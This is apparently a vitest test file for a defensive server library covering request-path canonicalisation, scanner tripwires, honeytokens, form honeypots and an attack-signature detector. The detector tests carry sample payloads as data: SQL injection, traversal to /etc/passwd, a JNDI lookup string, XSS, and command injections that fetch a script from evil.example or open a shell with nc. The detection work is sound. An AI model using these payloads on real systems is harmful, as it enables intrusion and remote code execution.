import { describe, expect, it } from "vitest";
import {
  ATTACK_SIGNATURE_IDS,
  canonicalizeRequestPath,
  createHoneypotField,
  createHoneytoken,
  createTripwire,
  DEFAULT_TRIPWIRE_PATHS,
  DEFAULT_TRIPWIRE_PREFIXES,
  findAttackSignature,
  injectHoneytokenLink,
  isInjectableHtml,
} from "../src/server/index.js";

describe("request path canonicalisation", () => {
  it("strips query and fragment and resolves the path the way a server would", () => {
    expect(canonicalizeRequestPath("/.env?x=1#frag")).toBe("/.env");
    expect(canonicalizeRequestPath("//.env")).toBe("/.env");
    expect(canonicalizeRequestPath("/x/..%2f.git/config")).toBe("/.git/config");
    expect(canonicalizeRequestPath("/%2Eenv")).toBe("/.env");
    expect(canonicalizeRequestPath("/%252e%252Fenv")).toBe("/env");
    expect(canonicalizeRequestPath("/a/./b/../c/")).toBe("/a/c/");
    expect(canonicalizeRequestPath("/../../..")).toBe("/");
    expect(canonicalizeRequestPath("/a\\..\\.env")).toBe("/.env");
    expect(canonicalizeRequestPath("")).toBe("/");
    expect(canonicalizeRequestPath("/")).toBe("/");
  });

  it("leaves non-ASCII and malformed escapes encoded", () => {
    expect(canonicalizeRequestPath("/caf%C3%A9")).toBe("/caf%C3%A9");
    expect(canonicalizeRequestPath("/100%")).toBe("/100%");
    expect(canonicalizeRequestPath("/%zz%4")).toBe("/%zz%4");
    expect(canonicalizeRequestPath("/%41%61")).toBe("/Aa");
  });
});

describe("tripwire", () => {
  it("matches the built-in scanner bait paths and prefixes", () => {
    const tripwire = createTripwire();
    expect(tripwire.match("/.env")).toEqual({ path: "/.env", matchedBy: "path", isDefault: true });
    expect(tripwire.match("/.ENV")?.matchedBy).toBe("path");
    expect(tripwire.match("//.git/HEAD")).toEqual({ path: "/.git/HEAD", matchedBy: "prefix", isDefault: true });
    expect(tripwire.match("/static/../.aws/credentials")?.matchedBy).toBe("prefix");
    expect(tripwire.match("/index.html")).toBeNull();
    expect(tripwire.match("/.well-known/security.txt")).toBeNull();
    expect(tripwire.paths).toContain("/.env");
    expect(tripwire.prefixes).toEqual([...DEFAULT_TRIPWIRE_PREFIXES]);
    expect(DEFAULT_TRIPWIRE_PATHS.length).toBeGreaterThan(15);
  });

  it("supports custom paths, prefixes and patterns, with defaults removable", () => {
    const tripwire = createTripwire({
      includeDefaults: false,
      paths: ["/admin-backup.zip", "/decoy/../hidden"],
      prefixes: ["/internal-api", "/legacy/"],
      patterns: [/\/wp-admin\//g],
    });
    expect(tripwire.match("/.env")).toBeNull();
    expect(tripwire.match("/admin-backup.zip")).toEqual({
      path: "/admin-backup.zip",
      matchedBy: "path",
      isDefault: false,
    });
    expect(tripwire.match("/hidden")?.isDefault).toBe(false);
    expect(tripwire.match("/internal-api/keys")).toMatchObject({ matchedBy: "prefix", isDefault: false });
    expect(tripwire.match("/legacy/a")?.matchedBy).toBe("prefix");
    expect(tripwire.match("/blog/wp-admin/x")?.matchedBy).toBe("pattern");
    expect(tripwire.match("/blog/wp-admin/y")?.matchedBy).toBe("pattern");
    expect(tripwire.prefixes).toEqual(["/internal-api", "/legacy/"]);
  });

  it("lets a custom entry override the default flag for the same path", () => {
    const tripwire = createTripwire({ paths: ["/.env"] });
    expect(tripwire.match("/.env")?.isDefault).toBe(false);
  });
});

describe("honeytoken", () => {
  it("derives the same stable path for every replica sharing a secret", () => {
    const first = createHoneytoken({ secret: "site-secret" });
    const second = createHoneytoken({ secret: "site-secret" });
    const other = createHoneytoken({ secret: "another-secret" });
    expect(first.current().path).toBe(second.current().path);
    expect(first.current().path).not.toBe(other.current().path);
    expect(first.current().path).toMatch(/^\/[a-z]+\/[0-9a-f]{12}$/);
    expect(first.current().activePaths).toEqual([first.current().path]);
    expect(first.stable).toBe(true);
    expect(first.rotate).toBe(false);
    expect(first.current()).toBe(first.current());
  });

  it("generates a random per-process secret when none is configured", () => {
    const token = createHoneytoken();
    expect(token.stable).toBe(false);
    expect(token.current().path).not.toBe(createHoneytoken().current().path);
  });

  it("renders a link that people, assistive technology and polite crawlers never follow", () => {
    const token = createHoneytoken({ secret: "s", basePath: "/trap/", text: "<b>more</b>" });
    const snapshot = token.current();
    expect(token.basePath).toBe("/trap");
    expect(snapshot.path.startsWith("/trap/")).toBe(true);
    expect(snapshot.linkHtml).toContain(`href="${snapshot.path}"`);
    expect(snapshot.linkHtml).toContain('rel="nofollow noindex"');
    expect(snapshot.linkHtml).toContain('aria-hidden="true"');
    expect(snapshot.linkHtml).toContain('tabindex="-1"');
    expect(snapshot.linkHtml).toContain(" hidden ");
    expect(snapshot.linkHtml).toContain("&lt;b&gt;more&lt;/b&gt;");
    expect(snapshot.linkAttributes).toMatchObject({ href: snapshot.path, hidden: "" });
  });

  it("rotates daily while keeping yesterday armed", () => {
    let now = Date.UTC(2026, 9, 10, 23, 59);
    const token = createHoneytoken({ secret: "s", rotate: true, now: () => now });
    const tonight = token.current();
    expect(tonight.activePaths).toHaveLength(2);
    expect(tonight.activePaths[0]).toBe(tonight.path);
    now += 2 * 60_000;
    const tomorrow = token.current();
    expect(tomorrow.path).not.toBe(tonight.path);
    expect(tomorrow.activePaths).toContain(tonight.path);
    expect(token.current()).toBe(tomorrow);
  });

  it("injects before the closing body tag, once, and only into full documents", () => {
    const link = '<a href="/x">.</a>';
    expect(injectHoneytokenLink("<html><body><p>hi</p></BODY></html>", link)).toBe(
      `<html><body><p>hi</p>${link}</BODY></html>`,
    );
    expect(injectHoneytokenLink("<html><p>no body</p></html>", link)).toBe(`<html><p>no body</p>${link}</html>`);
    expect(injectHoneytokenLink("<p>fragment</p>", link)).toBe("<p>fragment</p>");
    expect(injectHoneytokenLink("", link)).toBe("");
    const once = injectHoneytokenLink("<body></body>", link);
    expect(injectHoneytokenLink(once, link)).toBe(once);
  });

  it("only treats UTF-8 HTML documents as injectable", () => {
    expect(isInjectableHtml("text/html")).toBe(true);
    expect(isInjectableHtml("TEXT/HTML; charset=UTF-8")).toBe(true);
    expect(isInjectableHtml('text/html; charset="utf8"')).toBe(true);
    expect(isInjectableHtml("text/html; charset=iso-8859-1")).toBe(true);
    expect(isInjectableHtml("text/html; charset=UTF-16LE")).toBe(false);
    expect(isInjectableHtml("text/html; charset=ucs-2")).toBe(false);
    expect(isInjectableHtml("application/json")).toBe(false);
    expect(isInjectableHtml(undefined)).toBe(false);
    expect(isInjectableHtml(42)).toBe(false);
    expect(isInjectableHtml(["text/html"])).toBe(false);
  });
});

describe("form honeypot field", () => {
  it("renders an off-screen field and flags any value as filled", () => {
    const field = createHoneypotField();
    expect(field.name).toBe("hp_check");
    expect(field.html).toContain('name="hp_check"');
    expect(field.html).toContain("Leave this field empty");
    expect(field.html).toContain('tabindex="-1"');
    expect(field.html).toContain('autocomplete="off"');
    expect(field.html).toContain('aria-hidden="true"');
    expect(field.html).toContain("left:-9999px");
    expect(field.isFilled(undefined)).toBe(false);
    expect(field.isFilled(null)).toBe(false);
    expect(field.isFilled("   ")).toBe(false);
    expect(field.isFilled("https://spam.example")).toBe(true);
    expect(field.isFilled(0)).toBe(true);
  });

  it("accepts a class instead of inline styles for strict CSP pages", () => {
    const field = createHoneypotField({ name: "fax", label: "Fax <number>", className: "hp" });
    expect(field.html).toContain('class="hp"');
    expect(field.html).not.toContain("style=");
    expect(field.html).toContain("Fax &lt;number&gt;");
  });
});

describe("attack signatures", () => {
  it("matches the curated payloads in path and query, including encoded forms", () => {
    expect(findAttackSignature({ query: "id=1%20UNION%20SELECT%20password%20FROM%20users" })).toEqual({
      id: "sqli_union",
      label: "SQL UNION SELECT",
      where: "query",
    });
    expect(findAttackSignature({ query: "id=1+union+all+select+1" })?.id).toBe("sqli_union");
    expect(findAttackSignature({ query: "q=%2527%2520or%25201%253D1" })?.id).toBe("sqli_tautology");
    expect(findAttackSignature({ path: "/download/..%2f..%2f..%2fetc/passwd" })).toMatchObject({ id: "traversal", where: "path" });
    expect(findAttackSignature({ query: "x=${jndi:ldap://a}" })?.id).toBe("ssti_jndi");
    expect(findAttackSignature({ query: "x=<script>alert(1)</script>" })?.id).toBe("xss_script_tag");
    expect(findAttackSignature({ query: "x=%E0%A4%A" })).toBeNull();
    expect(findAttackSignature({ query: "x=%E0%27+or+1=1" })?.id).toBe("sqli_tautology");
    expect(findAttackSignature({ query: "id=1 UNION SELECT username, password FROM users" })?.id).toBe("sqli_union");
    expect(findAttackSignature({ query: "id=1/**/union/**/select/**/null" })?.id).toBe("sqli_union");
    expect(findAttackSignature({ query: "q=sleep(5)" })?.id).toBe("sqli_timing");
    expect(findAttackSignature({ query: "q=1;benchmark(1000000,md5(1))" })?.id).toBe("sqli_timing");
    expect(findAttackSignature({ query: "host=x;curl+http://evil.example/x.sh" })?.id).toBe("cmdi_shell");
    expect(findAttackSignature({ query: "host=x|nc+-e+/bin/sh+1.2.3.4" })?.id).toBe("cmdi_shell");
    expect(findAttackSignature({ query: "x=$(whoami)" })?.id).toBe("cmdi_subshell");
    expect(findAttackSignature({ query: "file=../../etc/passwd" })?.id).toBe("traversal_sensitive");
  });

  it("does not trip on ordinary searches that merely resemble payloads", () => {
    for (const query of [
      "q=Sleep+(2019+film)",
      "q=benchmark+(computing)",
      "q=Duke+%26+NC+State",
      "q=cat+videos+%7C+cat+toys",
      "tags=java;+python+3",
      "q=credit+union+select+account",
      "redirect=../../account",
      "a=1&id",
      "debug&id=5",
    ]) {
      expect(findAttackSignature({ query }), query).toBeNull();
    }
  });

  it("cannot be blinded by a bad escape or by padding", () => {
    expect(findAttackSignature({ query: "q=%27%20OR%201%3D1--&x=%" })?.id).toBe("sqli_tautology");
    expect(findAttackSignature({ query: `a=${"x".repeat(20_000)}&q=%27%20OR%201%3D1--` })?.id).toBe("sqli_tautology");
    expect(findAttackSignature({ query: `q=%27%20OR%201%3D1--&a=${"x".repeat(20_000)}` })?.id).toBe("sqli_tautology");
  });

  it("leaves ordinary requests alone", () => {
    expect(findAttackSignature({ path: "/products/shoes", query: "color=red&size=10&q=select+or+union" })).toBeNull();
    expect(findAttackSignature({ path: "/a/../b" })).toBeNull();
    expect(findAttackSignature({})).toBeNull();
  });

  it("inspects bodies and headers only when asked, and never cookies", () => {
    const input = {
      body: "name=<script>x</script>",
      headers: {
        cookie: "session=${jndi:ldap://x}",
        "X-Api-Version": "${jndi:ldap://x}",
        accept: ["text/html", "*/*"],
      },
    };
    expect(findAttackSignature(input)).toBeNull();
    expect(findAttackSignature(input, { inspect: ["body"] })?.where).toBe("body");
    expect(findAttackSignature(input, { inspect: ["headers"] })?.where).toBe("header:x-api-version");
    expect(findAttackSignature({ query: "a=1 union select 1" }, { inspect: ["headers"] })).toBeNull();
  });

  it("honours exclusions and the byte budget", () => {
    expect(findAttackSignature({ query: "a=1 union select 2" }, { exclude: ["sqli_union"] })).toBeNull();
    expect(findAttackSignature({ query: `${"a".repeat(40)} union select 1 ${"b".repeat(40)}` }, { maxBytes: 20 })).toBeNull();
    expect(ATTACK_SIGNATURE_IDS).toContain("cmdi_shell");
  });
});
